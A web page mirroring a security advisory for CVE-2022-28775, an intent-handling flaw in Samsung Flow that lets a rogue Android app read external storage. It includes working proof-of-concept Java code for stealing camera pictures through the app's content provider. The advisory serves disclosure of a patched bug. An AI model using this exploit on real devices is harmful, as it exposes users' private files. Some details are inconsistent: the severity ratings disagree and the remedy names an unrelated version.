---
layout: page
title: CVE-2022-28775 Details
permalink: /cves/CVE-2022-28775
---

#### Original post: [https://labs.f-secure.com/advisories/samsung-flow-any-app-can-read-the-external-storage/](https://labs.f-secure.com/advisories/samsung-flow-any-app-can-read-the-external-storage/)

|    **Product**    | Samsung Flow prior to version 4.8.06.5 |
|    **Severity**   |                  Medium                  |
| **CVE Reference** |             CVE-2022-28775             |
|      **Type**     |      Security Control Bypass      |

## Description

F-Secure looked into exploiting the Samsung Galaxy S21 device for Austin Pwn2Own 2021. Samsung Flow, an application offered on the Galaxy Store, had an issue with how it handled broadcasted intents. A rogue application could use this issue to read contents on the device's external storage without requiring the proper Android permissions.

## The Exploit

As an example, the following exploit code will exfiltrate a picture taken by the device's camera. This example requires two parts. First, the rogue application must contain an exported activity with the following Java code:

```
public class IntentProxyToContentProvider extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Uri uri = Uri.parse(getIntent().getDataString());
        try {
            Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri));
            Log.d("yaytagyay", String.valueOf(bitmap.getByteCount()));
            String yayuriyay = MediaStore.Images.Media.insertImage(getContentResolver(),
                    bitmap,
                    "yaytitleyay",
                    "yaydescriptionyay"); 
            String File_Name = "yayuriyay.txt";
            FileOutputStream fileobj = openFileOutput(File_Name, Context.MODE_PRIVATE);
            String targetUri = yayuriyay + "\n";
            byte[] ByteArray = targetUri.getBytes();
            fileobj.write(ByteArray);
            fileobj.close();
            Log.d("yaytagyay", "Result: " + yayuriyay);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

Second, the rogue application must send the following Broadcast, replacing "<target picture>" with the name of the picture found on the device, and "<rogue application package>" with the package name of the rogue application:

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.samsung.android.galaxycontinuity", "com.samsung.android.galaxycontinuity.manager.GlobalBroadcastReceiver"));
intent.setAction("com.samsung.android.galaxycontinuity.action.ACTION_FLOW_CONTENT_PENDING_INTENT"); 
Intent intent2 = new Intent();
intent2.setComponent(new ComponentName("<rogue application package>", " <rogue application package>.IntentProxyToContentProvider"));
intent2.setData(Uri.parse("content://com.samsung.android.galaxycontinuity.provider/external_files/DCIM/Camera/<target picture name>"));
intent2.setFlags(195);
Bundle bundle = new Bundle();
bundle.putParcelable("_data", intent2);
bundle.putString("ClassName", "com.samsung.android.galaxycontinuity.activities.ChooserDelegateActivity");
intent.putExtras(bundle); 
sendBroadcast(intent);
```

## Technical Details



## Remedial Action

Samsung has released the Galaxy Store version 4.5.36.4 which addresses this issue. Users should update their Galaxy Store application to the latest version available.

## Credits

This issue was discovered by Ken Gannon.

## Timeline

|    **Date**    | **Summary** |
|   17/10/2021   | Issue disclosed to Samsung Mobile Security |
|   17/10/2021   | Issue assigned to a Samsung Security Analyst |
|   22/11/2021   | Samsung confirms the vulnerability and rates it as a critical risk issue |
|   13/02/2022   | Patch released, Samsung initiates process for bug bounty reward |
|   12/04/2022   | CVE Assigned |
|   04/05/2022   | Advisory Published |